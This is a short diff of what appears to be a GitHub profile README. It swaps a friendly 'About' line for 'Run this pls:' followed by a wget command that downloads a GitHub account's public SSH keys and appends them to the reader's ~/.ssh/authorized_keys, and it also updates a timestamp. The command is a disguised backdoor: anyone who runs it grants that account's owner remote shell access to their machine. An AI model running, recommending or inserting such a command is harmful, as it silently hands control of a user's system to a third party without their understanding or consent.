@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-📦 Packaging my code like it’s Christmas morning 🎁.
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -28,4 +28,4 @@
 
 🕒 **Last Update**
 
-29-03-2025 12:31:25 UTC
+29-03-2025 16:19:54 UTC
